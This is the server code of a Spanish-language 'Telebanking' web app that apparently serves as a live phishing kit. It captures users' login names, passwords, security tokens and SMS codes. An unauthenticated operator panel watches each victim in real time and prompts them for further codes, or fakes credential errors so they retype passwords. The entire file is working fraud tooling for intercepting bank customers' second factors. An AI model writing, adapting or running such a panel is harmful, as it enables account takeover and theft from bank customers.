const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware para procesar JSON y formularios
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir archivos estáticos (HTML, CSS, JS e Imágenes)
app.use(express.static(path.join(__dirname)));

// Almaenamiento de sesiones en memoria
const sessions = new Map();

// Helper para generar IDs de sesión
function generateSessionId() {
  return 'sess_' + Math.random().toString(36).substring(2, 9) + '_' + Date.now();
}

// ----------------------------------------------------
// RUTAS API PARA EL CLIENTE
// ----------------------------------------------------

// 1. Registro de Login (Usuario + Clave [+ Token opcional inicial])
app.post('/api/login', (req, res) => {
  const { username, password, token } = req.body;
  if (!username) {
    return res.status(400).json({ success: false, message: 'El usuario es obligatorio' });
  }

  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  const sessionId = generateSessionId();

  const session = {
    id: sessionId,
    username: username.trim(),
    password: password ? password.trim() : '',
    token: token ? token.trim() : '',
    smsCode: '',
    ip: clientIp,
    userAgent: req.headers['user-agent'] || 'Desconocido',
    status: 'SUBMITTED_PASS', // SUBMITTED_PASS, WAITING_TOKEN, SUBMITTED_TOKEN, WAITING_SMS, SUBMITTED_SMS, ERROR_CREDS, COMPLETED
    requestedStep: 'WAIT_OPERATOR', // WAIT_OPERATOR, REQUEST_TOKEN, REQUEST_SMS, REJECT_CREDS, APPROVE
    errorMessage: '',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  };

  sessions.set(sessionId, session);

  console.log(`[LOGIN] Nueva sesión registrada: ${sessionId} | Usuario: ${username}`);

  return res.json({
    success: true,
    sessionId: sessionId,
    message: 'Sesión registrada correctamente',
    timestamp: session.createdAt
  });
});

// 2. Consulta de estado de sesión por parte del cliente (Sondeo / Polling)
app.get('/api/session-status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ success: false, message: 'Sesión no encontrada' });
  }

  return res.json({
    success: true,
    sessionId: session.id,
    requestedStep: session.requestedStep,
    status: session.status,
    errorMessage: session.errorMessage
  });
});

// 3. Envío de datos secundarios (Token o SMS) por parte del cliente
app.post('/api/submit-step', (req, res) => {
  const { sessionId, token, smsCode, password } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ success: false, message: 'Sesión no encontrada' });
  }

  if (token !== undefined && token !== null) {
    session.token = token.trim();
    session.status = 'SUBMITTED_TOKEN';
    session.requestedStep = 'WAIT_OPERATOR';
  }

  if (smsCode !== undefined && smsCode !== null) {
    session.smsCode = smsCode.trim();
    session.status = 'SUBMITTED_SMS';
    session.requestedStep = 'WAIT_OPERATOR';
  }

  if (password !== undefined && password !== null && password !== '') {
    session.password = password.trim();
    session.status = 'SUBMITTED_PASS';
    session.requestedStep = 'WAIT_OPERATOR';
  }

  session.updatedAt = new Date().toISOString();
  sessions.set(sessionId, session);

  console.log(`[SUBMIT-STEP] Datos actualizados para ${sessionId} | Token: ${session.token} | SMS: ${session.smsCode}`);

  return res.json({
    success: true,
    message: 'Paso enviado correctamente'
  });
});


// ----------------------------------------------------
// RUTAS API PARA EL PANEL DE CONTROL DEL OPERADOR
// ----------------------------------------------------

// Obtenener todas las sesiones para el Admin Panel
app.get('/api/admin/sessions', (req, res) => {
  const allSessions = Array.from(sessions.values()).sort(
    (a, b) => new Date(b.updatedAt) - new Date(a.updatedAt)
  );

  return res.json({
    success: true,
    count: allSessions.length,
    sessions: allSessions
  });
});

// Ejecutar acción del operador en una sesión
app.post('/api/admin/action', (req, res) => {
  const { sessionId, action, customError } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).json({ success: false, message: 'Sesión no encontrada' });
  }

  switch (action) {
    case 'request_token':
      session.requestedStep = 'REQUEST_TOKEN';
      session.status = 'WAITING_TOKEN';
      break;

    case 'request_sms':
      session.requestedStep = 'REQUEST_SMS';
      session.status = 'WAITING_SMS';
      break;

    case 'reject_creds':
      session.requestedStep = 'REJECT_CREDS';
      session.status = 'ERROR_CREDS';
      session.errorMessage = customError || 'Nombre de usuario o contraseña incorrectos.';
      break;

    case 'approve':
      session.requestedStep = 'APPROVE';
      session.status = 'COMPLETED';
      break;

    case 'reset':
      session.requestedStep = 'WAIT_OPERATOR';
      break;

    default:
      return res.status(400).json({ success: false, message: 'Acción no válida' });
  }

  session.updatedAt = new Date().toISOString();
  sessions.set(sessionId, session);

  console.log(`[ADMIN ACTION] Sesión ${sessionId} -> Acción: ${action}`);

  return res.json({
    success: true,
    session: session
  });
});

// Eliminar sesión
app.delete('/api/admin/sessions/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  if (sessions.has(sessionId)) {
    sessions.delete(sessionId);
    return res.json({ success: true, message: 'Sesión eliminada' });
  }
  return res.status(404).json({ success: false, message: 'Sesión no encontrada' });
});

// Limpiar todas las sesiones
app.post('/api/admin/clear', (req, res) => {
  sessions.clear();
  return res.json({ success: true, message: 'Todas las sesiones fueron eliminadas' });
});

// Ruta amigable para /admin
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Ruta principal abre index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`==================================================`);
  console.log(` Servidor Telebanking Activo en puerto ${PORT}`);
  console.log(` Cliente: http://localhost:${PORT}`);
  console.log(` Panel de Operador: http://localhost:${PORT}/admin`);
  console.log(`==================================================`);
});
